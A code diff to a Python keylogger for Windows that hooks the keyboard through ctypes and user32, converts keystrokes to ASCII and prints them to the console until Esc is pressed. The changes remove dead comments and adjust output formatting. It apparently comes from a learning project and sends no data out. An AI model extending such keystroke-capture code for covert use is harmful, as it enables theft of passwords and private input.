@@ -360,6 +360,9 @@ from ctypes import *
 from ctypes.wintypes import DWORD
 
 
+
+
+# Check flag for GetKeyState result
 STATE_KEYDOWN = 0x8000
 STATE_KEYTOGGLE = 0x0001
 
@@ -428,32 +431,6 @@ class KeyLogger:
 
 def KeyHookProc( nCode, wParam, lParam ):
 
-
-#
-#MsgToName =
-#{
-#    WM_MOUSEMOVE : 'mouse move',
-#    WM_LBUTTONDOWN : 'mouse left down', 
-#    WM_LBUTTONUP : 'mouse left up',
-#    WM_LBUTTONDBLCLK : 'mouse left double', 
-#    WM_RBUTTONDOWN : 'mouse right down',
-#    WM_RBUTTONUP : 'mouse right up', 
-#    WM_RBUTTONDBLCLK : 'mouse right double',
-#    WM_MBUTTONDOWN : 'mouse middle down', 
-#    WM_MBUTTONUP : 'mouse middle up',
-#    WM_MBUTTONDBLCLK : 'mouse middle double', 
-#    WM_MOUSEWHEEL : 'mouse wheel',
-#    WM_KEYDOWN : 'key down', 
-#    WM_KEYUP : 'key up',
-#    WM_CHAR : 'key char',
-#    WM_DEADCHAR : 'key dead char', 
-#    WM_SYSKEYDOWN : 'key sys down',
-#    WM_SYSKEYUP : 'key sys up', 
-#    WM_SYSCHAR : 'key sys char',
-#    WM_SYSDEADCHAR : 'key sys dead char'
-#}
-
-
 # https://www.cnblogs.com/franknihao/p/7904434.html
 #*   MessageName: key down ------------> Messageの名前. MsgToName辞書
 #*   Message: 256 ---------------------> wParam. WM_KEYDOWNとかWM_KEYUPとか.
@@ -489,7 +466,7 @@ def KeyHookProc( nCode, wParam, lParam ):
 
 
     if( user32.GetKeyState(win32con.VK_ESCAPE) & STATE_KEYDOWN ):
-        print("\nCtrl pressed. Exiting keylogger." )
+        print("\nEsc pressed. Exiting keylogger." )
         #user32.SendMessageW( hwnd, win32con.WM_CLOSE, 0, 0 )
         user32.PostQuitMessage(0)
         return 0
@@ -502,23 +479,23 @@ def KeyHookProc( nCode, wParam, lParam ):
         keyboard_state = ( ctypes.c_char * 256 )()
         user32.GetKeyboardState( byref(keyboard_state) )
 
-        # VK_CodeからUnicodeへの変換
-        #str = create_unicode_buffer(8)
-        #n = user32.ToUnicode( kb.vkCode, kb.scanCode, keyboard_state, str, 8-1, 0 )
+        ## VK_CodeからUnicodeへの変換
+        #buf = create_unicode_buffer(8)
+        #n = user32.ToUnicode( kb.vkCode, kb.scanCode, keyboard_state, buf, 8-1, 0 )
         #if( n > 0 ):
         #    if( kb.vkCode == win32con.VK_RETURN ):
         #        print()
         #    else:
-        #        print( ctypes.wstring_at(str), end="", flush=True )
+        #        print( ctypes.wstring_at(buf), flush=True )
 
         # VK_CodeからASCIIへの変換
         str_ascii = create_string_buffer(2)
         n_ascii = user32.ToAscii( kb.vkCode, kb.scanCode, keyboard_state, str_ascii, 0 )
         if( n_ascii > 0 ):
             if( kb.vkCode == win32con.VK_RETURN ):
-                print()
+                print( ctypes.string_at(str_ascii), flush=True )
             else:
-                print( ctypes.string_at(str_ascii), end="", flush=True )
+                print( ctypes.string_at(str_ascii), flush=True )
 
     result = True# KeyEvent
     if( result ):
@@ -533,14 +510,13 @@ if __name__=="__main__":
     KeyLogger = KeyLogger()
     pointer = HOOKPROC( KeyHookProc )
     KeyLogger.InstallHookProc( pointer )
-    msg = ctypes.wintypes.MSG()
 
     print("Start keylogger...")
 
+    msg = ctypes.wintypes.MSG()
     user32.GetMessageW( byref(msg), 0, 0, 0 )
     #import pythoncom
     #pythoncom.PumpMessages()# equivalent to GetMessageW
-
 
     print("End keylogger...")
 
